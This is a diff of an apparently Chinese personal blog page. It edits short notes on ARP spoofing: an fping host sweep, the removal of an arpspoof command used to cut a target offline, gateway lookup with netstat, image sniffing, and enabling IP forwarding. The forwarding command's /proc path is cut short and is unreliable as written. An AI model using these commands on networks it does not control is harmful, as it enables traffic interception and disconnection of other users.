@@ -1554,10 +1554,13 @@ CMP（比较）指令执行从目的操作数中减去源操作数的隐含减�
                         
                             1.查看局域网中的主机
 fping –asg 192.168.1.0/24
-2.断网
-arpspoof -i wlan0 -t 192.168.100 192.168.1.1
-(arpspoof  -i 网卡 -t 目标IP 网关)
-3.流
+查看网关
+netstat -nr
+
+图片嗅探
+
+使用命令进行流量转发：要使用ip重定向才能进行arp欺骗
+echo 1 &gt;/proc/sys/net/ipv4
                         
                     </div>
                     <div class="publish-info">
@@ -1813,7 +1816,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">80.2k</span>&nbsp;字
+                class="white-color">80.6k</span>&nbsp;字
             
             
             
